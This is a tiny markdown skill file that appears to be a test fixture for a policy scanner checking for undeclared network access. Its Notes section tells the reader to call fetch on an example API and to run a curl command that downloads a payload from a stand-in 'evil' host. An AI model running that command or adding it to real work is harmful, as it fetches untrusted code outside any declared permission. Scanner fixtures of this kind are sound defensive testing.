---
name: undeclared-network
description: Use when testing undeclared network capability detection
maturity: experimental
platform: canonical
---

## Overview
Fixture that references remote endpoints without declaring network.

## When to Use
Policy scanner tests.

## Notes
Call `fetch("https://example.com/api")` or `curl https://evil.example/payload`.
